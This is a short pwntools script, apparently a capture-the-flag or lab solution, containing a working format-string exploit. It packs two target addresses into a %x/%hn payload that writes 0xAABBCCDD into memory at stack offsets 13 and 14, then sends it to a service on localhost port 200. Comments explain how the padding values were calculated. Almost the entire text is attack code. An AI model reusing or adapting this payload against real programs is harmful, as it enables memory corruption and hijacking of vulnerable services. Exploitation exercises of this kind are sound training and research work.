from pwn import *

host = "127.0.0.1" #Local host
portNum = 200 #Given in the program

targetAddress = "\xcc\xd0\x04\x08\xce\xd0\x04\x08"
s1 = 52437 #0xCCDD - 8 in decimal
s2 = 56798 #0x1AABB - 0xCCDD -> add a 1 before the alpha-numerals as 0xAABB < 0xCCDD 

                                #Below sends %52437x (s1)to 13th element on stack as a short
                                #Then it sends %56798x to 14th element on stack as short
exploit = f"{targetAddress}" + f"%{str(s1)}x%13$hn%{str(s2)}" + f"x%14$hn"  

eol = b'\r\n' #To mark the end of recieve on server side
print('sending exploit: '+exploit)
io=connect(host, portNum)
io.send(exploit)
"\xcc\xd0\x04\x08\xce\xd0\x04\x08" + "%52437x" + "%13$hn" + "%56798x" + "%14$hn"